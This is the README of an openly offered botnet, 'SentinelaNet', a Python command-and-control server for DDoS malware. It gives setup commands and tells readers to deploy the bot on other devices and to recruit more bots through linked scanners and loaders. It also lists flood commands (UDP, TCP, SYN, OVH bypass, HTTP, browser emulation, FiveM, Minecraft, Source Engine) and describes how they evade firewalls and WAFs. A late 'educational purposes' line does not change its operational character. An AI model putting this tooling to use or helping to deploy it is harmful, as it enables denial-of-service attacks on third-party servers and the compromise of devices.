<div align="center">
<h1>SentinelaNet</h1>
<h3>SentinelaNet is a CNC (Command and Control) in Python, designed to manage malware that carries out mass shooting attacks (DDoS).</h3>
 
<p align=
      
https://github.com/user-attachments/assets/22f0f21b-e1fc-4b75-9442-4b2ce5c2ee9c
</p>
<p>This Botnet is to be an improved version of KryptonC2 and will be made publicly available for free.</p>

</div>

<br>

## **Installation** 📁
```shell script
git clone https://github.com/CirqueiraDev/SentinelaNet
```
```shell script
cd SentinelaNet
```

```shell script
pip install colorama
```
```shell script
python3 cnc.py 1337
```
**Logins are saved in logins.txt in the format "username:password" within the logins.txt file**

<br>

## Configure malware 💣

- Change the IP and port of bot.py with the IP (public IP if it is not a local test) and the port of your CNC server then save the file.

- Then run the malware on another device that supports python (if the target does not have python you can try to compile the malware)

- Tente usar <a href="https://github.com/CirqueiraDev/botnet-exploits">Scanners e Loaders</a> para carregar mais bots. OBS: não é possivel gerar um binario TOTALMENTE estático com python PURO!

<br>

---

<div align="center">

### Admin/root Commands
Command | Description
  --------|------------
!admin, !adm | Shows list of admin commands
!user, !u | Add/List/Remove users
!blacklist, !bl | Add/List/Remove blacklisted targets
    
### CNC Commands
Command | Description
  --------|------------
help, ? | Shows list of commands
botnet | Shows list of botnet attack methods
bots | Shows all connected bots
stop | Stop all your floods in progress
clear, cls | Clears the console window screen
exit, logout | Disconnects from the C&C server

### Attack Commands
Command | Usage | Description
---------|-----------|-------------
.UDP | \<target> \<port> \<time> | Starts UDP Flood Bypass
.TCP | \<target> \<port> \<time> | Starts TCP Flood Bypass
.OVHUDP | \<target> \<port> \<time> | Starts OVH UDP Flood Bypass
.OVHTCP | \<target> \<port> \<time> | Starts OVH TCP Flood Bypass
.MIX | \<target> \<port> \<time> | Starts TCP and UDP Flood Bypass
.SYN | \<target> \<port> \<time> | Starts TCP SYN Flood
.HEX | \<target> \<port> \<time> | Starts HEXdecimal Flood
.VSE | \<target> \<port> \<time> | Send Valve Source Engine Protocol
.MCPE | \<target> \<port> \<time> | Minecraft PE Status Ping Protocol
.FIVEM | \<target> \<port> \<time> | Send FiveM Status Ping Protocol
.HTTPGET | \<target> \<port> \<time> | Starts HTTP/1.1 GET Flood
.HTTPPOST| \<target> \<port> \<time> | Starts HTTP/1.1 POST Flood
.BROWSER | \<target> \<port> \<time> | Starts HTTP/1.1 BROWSER Simulator Flood
</div>

<br>

### 📌 About attacks Implemented Attacks
## 🔹 Network-Based Attacks (Layer 3 and 4 - UDP/TCP)

### 🟢 UDP Flood (`attack_udp_bypass`)
- Sends UDP packets of varying sizes to overwhelm the target.
- Can be mitigated by firewalls and ISP rate-limiting.

### 🟢 TCP Flood (`attack_tcp_bypass`)
- Sends TCP packets continuously to exhaust target connections.
- If there is no proper handshake, it can be blocked easily.

### 🟢 SYN Flood (`attack_syn`)
- Sends SYN requests to exhaust pending TCP connections.
- Effective against poorly protected servers.
- Modern firewalls use **SYN Cookies** to mitigate.

### 🟢 Hybrid Attack (`attack_tcp_udp_bypass`)
- Switches between TCP and UDP to confuse defenses.
- Can avoid static filters, but is still detectable by behavioral analysis.

### 🟢 Malformed OVH TCP Flood (`attack_ovh_tcp`)
- Sends fake HTTP requests (PGET) with anomalous paths (/0/0/0/0, \0\0\0\0).
- Randomizes bytes (0x00 to 0xFF) and line terminators to bypass WAFs.
- Uses multiple TCP connections (connect, connect_ex) to saturate the server.
- Mitigation: Firewalls with filtering invalid HTTP methods and rate-limiting.

### 🟢 OVH UDP Flood with Random Payload (`attack_ovh_udp`)
- Floods the target port with UDP datagrams containing random payloads (up to 2048 bytes).
- Does not require handshake, making tracking difficult.
- Effective against exposed UDP services (DNS, VoIP).
- Mitigation: Blocking non-essential UDP traffic and behavioral analysis.

### 🟢 OVH Hybrid Attack (`OVHTCP + OVHUDP`)
- Combines `attack_ovh_tcp` and `attack_ovh_udp` into parallel threads.
- Objective: Confuse static defenses (e.g. firewalls that only block TCP).
- Mitigation: Anti-DDoS solutions with hybrid pattern detection (e.g. Cloudflare).
<br>

## 🔹 Attacks on Applications (Layer 7 - HTTP)

### 🔵 HTTP GET Flood (`attack_http_get`)
- Simulates massive access to a website to overload the server.
- Can be mitigated by **CAPTCHA, Cloudflare and Rate-Limiting**.

### 🔵 HTTP POST Flood (`attack_http_post`)
- Simulates sending data to consume server processing.
- Harder to mitigate than GET, but can be blocked with authentication or firewall rules.

### 🔵 Browser Emulation (`attack_browser`)
- Simulates real browser traffic to bypass basic protections.
- Can fool simple blocks, but doesn't work against advanced defenses.

<br>

## 🔹 Game-Specific Attacks

### 🎮 FiveM Attack (`attack_fivem`)
- Exploits vulnerabilities in the FiveM communication protocol.
- FiveM has improved its protections, but poorly configured servers can still be affected.

### 🎮 Minecraft PE Attack (`attack_mcpe`)
- Sends corrupted packets to exploit flaws in the game's network.
- It can affect servers without adequate protection, but patterns of this attack are already blocked in some services.

### 🎮 VSE Query Flood (`attack_vse`)
- Exploits game server query protocol to generate excessive load.
- Widely used against **Source Engine** servers (CS:GO, TF2, etc.).

<br>

⚠️ **Note:** This project is for educational and research purposes only. Improper use may be illegal and result in legal penalties. Always use security knowledge to protect systems, not to attack them.

<br>

---

### News ✨
- Updated CNC
- Added blacklist ```03/01/2025```
- Updated bots command ```02/05/2025```
- Now the `bots` command displays the number of bots currently connected to C2, and organized by system architecture (for example: `x86_64`, `arm`, `mips`) (**also shows the number in each architecture**).
- STOP command added ```09/05/2025```

- Updated Payload
- Updated Browser Flood ```03/01/2025```
- Updated UDP Flood Bypass ```06/03/2025```
- Updated UDP Flood removed ```06/03/2025```
- Added TCP and UDP Flood Bypass ```07/03/2025```
- Updated SYN Flood ```07/03/2025```
- Added OVHUDP and OVHTCP Flood Bypass ```04/05/2025```
- OVH BUILDER Fixed ```05/09/2025```
---

###Owner
- **Discord: Cirqueira**
- <a href="https://www.instagram.com/cirqueirax/">Meu instagram</a>
